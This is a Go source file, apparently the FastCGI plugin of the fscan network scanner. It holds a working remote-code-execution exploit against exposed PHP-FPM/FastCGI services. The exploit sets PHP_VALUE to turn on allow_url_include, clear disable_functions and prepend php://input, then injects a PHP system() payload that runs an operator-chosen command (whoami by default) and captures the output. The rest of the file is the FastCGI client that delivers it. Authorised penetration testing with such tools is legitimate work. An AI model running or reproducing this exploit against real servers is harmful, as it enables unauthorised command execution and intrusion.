package Plugins

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"io"
	"strconv"
	"strings"
	"sync"
	"time"
)

//links
//https://xz.aliyun.com/t/9544
//https://github.com/wofeiwo/webcgi-exploits

// FcgiScan 执行FastCGI服务器漏洞扫描
func FcgiScan(info *Common.HostInfo) error {
	// 如果设置了暴力破解模式则跳过
	if Common.DisableBrute {
		return nil
	}

	// 设置目标URL路径
	url := "/etc/issue"
	if Common.RemotePath != "" {
		url = Common.RemotePath
	}
	addr := fmt.Sprintf("%v:%v", info.Host, info.Ports)

	// 构造PHP命令注入代码
	var reqParams string
	var cutLine = "-----ASDGTasdkk361363s-----\n" // 用于分割命令输出的标记

	switch {
	case Common.Command == "read":
		reqParams = "" // 读取模式
	case Common.Command != "":
		reqParams = fmt.Sprintf("<?php system('%s');die('%s');?>", Common.Command, cutLine) // 自定义命令
	default:
		reqParams = fmt.Sprintf("<?php system('whoami');die('%s');?>", cutLine) // 默认执行whoami
	}

	// 设置FastCGI环境变量
	env := map[string]string{
		"SCRIPT_FILENAME": url,
		"DOCUMENT_ROOT":   "/",
		"SERVER_SOFTWARE": "go / fcgiclient ",
		"REMOTE_ADDR":     "127.0.0.1",
		"SERVER_PROTOCOL": "HTTP/1.1",
	}

	// 根据请求类型设置对应的环境变量
	if len(reqParams) != 0 {
		env["CONTENT_LENGTH"] = strconv.Itoa(len(reqParams))
		env["REQUEST_METHOD"] = "POST"
		env["PHP_VALUE"] = "allow_url_include = On\ndisable_functions = \nauto_prepend_file = php://input"
	} else {
		env["REQUEST_METHOD"] = "GET"
	}

	// 建立FastCGI连接
	fcgi, err := New(addr, Common.Timeout)
	defer func() {
		if fcgi.rwc != nil {
			fcgi.rwc.Close()
		}
	}()
	if err != nil {
		fmt.Printf("FastCGI连接失败 %v:%v - %v\n", info.Host, info.Ports, err)
		return err
	}

	// 发送FastCGI请求
	stdout, stderr, err := fcgi.Request(env, reqParams)
	if err != nil {
		fmt.Printf("FastCGI请求失败 %v:%v - %v\n", info.Host, info.Ports, err)
		return err
	}

	// 处理响应结果
	output := string(stdout)
	var result string

	if strings.Contains(output, cutLine) {
		// 命令执行成功，提取输出结果
		output = strings.SplitN(output, cutLine, 2)[0]
		if len(stderr) > 0 {
			result = fmt.Sprintf("FastCGI漏洞确认 %v:%v\n命令输出:\n%v\n错误信息:\n%v\n建议尝试其他路径，例如: -path /www/wwwroot/index.php",
				info.Host, info.Ports, output, string(stderr))
		} else {
			result = fmt.Sprintf("FastCGI漏洞确认 %v:%v\n命令输出:\n%v",
				info.Host, info.Ports, output)
		}
		Common.LogSuccess(result)
	} else if strings.Contains(output, "File not found") ||
		strings.Contains(output, "Content-type") ||
		strings.Contains(output, "Status") {
		// 目标存在FastCGI服务但可能路径错误
		if len(stderr) > 0 {
			result = fmt.Sprintf("FastCGI服务确认 %v:%v\n响应:\n%v\n错误信息:\n%v\n建议尝试其他路径，例如: -path /www/wwwroot/index.php",
				info.Host, info.Ports, output, string(stderr))
		} else {
			result = fmt.Sprintf("FastCGI服务确认 %v:%v\n响应:\n%v",
				info.Host, info.Ports, output)
		}
		Common.LogSuccess(result)
	}

	return nil
}

// for padding so we don't have to allocate all the time
// not synchronized because we don't care what the contents are
var pad [maxPad]byte

const (
	FCGI_BEGIN_REQUEST uint8 = iota + 1
	FCGI_ABORT_REQUEST
	FCGI_END_REQUEST
	FCGI_PARAMS
	FCGI_STDIN
	FCGI_STDOUT
	FCGI_STDERR
)

const (
	FCGI_RESPONDER uint8 = iota + 1
)

const (
	maxWrite = 6553500 // maximum record body
	maxPad   = 255
)

type header struct {
	Version       uint8
	Type          uint8
	Id            uint16
	ContentLength uint16
	PaddingLength uint8
	Reserved      uint8
}

func (h *header) init(recType uint8, reqId uint16, contentLength int) {
	h.Version = 1
	h.Type = recType
	h.Id = reqId
	h.ContentLength = uint16(contentLength)
	h.PaddingLength = uint8(-contentLength & 7)
}

type record struct {
	h   header
	buf [maxWrite + maxPad]byte
}

func (rec *record) read(r io.Reader) (err error) {
	if err = binary.Read(r, binary.BigEndian, &rec.h); err != nil {
		return err
	}
	if rec.h.Version != 1 {
		return errors.New("fcgi: invalid header version")
	}
	n := int(rec.h.ContentLength) + int(rec.h.PaddingLength)
	if _, err = io.ReadFull(r, rec.buf[:n]); err != nil {
		return err
	}
	return nil
}

func (r *record) content() []byte {
	return r.buf[:r.h.ContentLength]
}

type FCGIClient struct {
	mutex     sync.Mutex
	rwc       io.ReadWriteCloser
	h         header
	buf       bytes.Buffer
	keepAlive bool
}

func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
	conn, err := Common.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
	fcgi = &FCGIClient{
		rwc:       conn,
		keepAlive: false,
	}
	return
}

func (c *FCGIClient) writeRecord(recType uint8, reqId uint16, content []byte) (err error) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	c.buf.Reset()
	c.h.init(recType, reqId, len(content))
	if err := binary.Write(&c.buf, binary.BigEndian, c.h); err != nil {
		return err
	}
	if _, err := c.buf.Write(content); err != nil {
		return err
	}
	if _, err := c.buf.Write(pad[:c.h.PaddingLength]); err != nil {
		return err
	}
	_, err = c.rwc.Write(c.buf.Bytes())
	return err
}

func (c *FCGIClient) writeBeginRequest(reqId uint16, role uint16, flags uint8) error {
	b := [8]byte{byte(role >> 8), byte(role), flags}
	return c.writeRecord(FCGI_BEGIN_REQUEST, reqId, b[:])
}

func (c *FCGIClient) writeEndRequest(reqId uint16, appStatus int, protocolStatus uint8) error {
	b := make([]byte, 8)
	binary.BigEndian.PutUint32(b, uint32(appStatus))
	b[4] = protocolStatus
	return c.writeRecord(FCGI_END_REQUEST, reqId, b)
}

func (c *FCGIClient) writePairs(recType uint8, reqId uint16, pairs map[string]string) error {
	w := newWriter(c, recType, reqId)
	b := make([]byte, 8)
	for k, v := range pairs {
		n := encodeSize(b, uint32(len(k)))
		n += encodeSize(b[n:], uint32(len(v)))
		if _, err := w.Write(b[:n]); err != nil {
			return err
		}
		if _, err := w.WriteString(k); err != nil {
			return err
		}
		if _, err := w.WriteString(v); err != nil {
			return err
		}
	}
	w.Close()
	return nil
}

func readSize(s []byte) (uint32, int) {
	if len(s) == 0 {
		return 0, 0
	}
	size, n := uint32(s[0]), 1
	if size&(1<<7) != 0 {
		if len(s) < 4 {
			return 0, 0
		}
		n = 4
		size = binary.BigEndian.Uint32(s)
		size &^= 1 << 31
	}
	return size, n
}

func readString(s []byte, size uint32) string {
	if size > uint32(len(s)) {
		return ""
	}
	return string(s[:size])
}

func encodeSize(b []byte, size uint32) int {
	if size > 127 {
		size |= 1 << 31
		binary.BigEndian.PutUint32(b, size)
		return 4
	}
	b[0] = byte(size)
	return 1
}

// bufWriter encapsulates bufio.Writer but also closes the underlying stream when
// Closed.
type bufWriter struct {
	closer io.Closer
	*bufio.Writer
}

func (w *bufWriter) Close() error {
	if err := w.Writer.Flush(); err != nil {
		w.closer.Close()
		return err
	}
	return w.closer.Close()
}

func newWriter(c *FCGIClient, recType uint8, reqId uint16) *bufWriter {
	s := &streamWriter{c: c, recType: recType, reqId: reqId}
	w := bufio.NewWriterSize(s, maxWrite)
	return &bufWriter{s, w}
}

// streamWriter abstracts out the separation of a stream into discrete records.
// It only writes maxWrite bytes at a time.
type streamWriter struct {
	c       *FCGIClient
	recType uint8
	reqId   uint16
}

func (w *streamWriter) Write(p []byte) (int, error) {
	nn := 0
	for len(p) > 0 {
		n := len(p)
		if n > maxWrite {
			n = maxWrite
		}
		if err := w.c.writeRecord(w.recType, w.reqId, p[:n]); err != nil {
			return nn, err
		}
		nn += n
		p = p[n:]
	}
	return nn, nil
}

func (w *streamWriter) Close() error {
	// send empty record to close the stream
	return w.c.writeRecord(w.recType, w.reqId, nil)
}

func (c *FCGIClient) Request(env map[string]string, reqStr string) (retout []byte, reterr []byte, err error) {

	var reqId uint16 = 1
	defer c.rwc.Close()

	err = c.writeBeginRequest(reqId, uint16(FCGI_RESPONDER), 0)
	if err != nil {
		return
	}
	err = c.writePairs(FCGI_PARAMS, reqId, env)
	if err != nil {
		return
	}
	if len(reqStr) > 0 {
		err = c.writeRecord(FCGI_STDIN, reqId, []byte(reqStr))
		if err != nil {
			return
		}
	}

	rec := &record{}
	var err1 error

	// recive untill EOF or FCGI_END_REQUEST
	for {
		err1 = rec.read(c.rwc)
		if err1 != nil {
			if err1 != io.EOF {
				err = err1
			}
			break
		}
		switch {
		case rec.h.Type == FCGI_STDOUT:
			retout = append(retout, rec.content()...)
		case rec.h.Type == FCGI_STDERR:
			reterr = append(reterr, rec.content()...)
		case rec.h.Type == FCGI_END_REQUEST:
			fallthrough
		default:
			break
		}
	}

	return
}
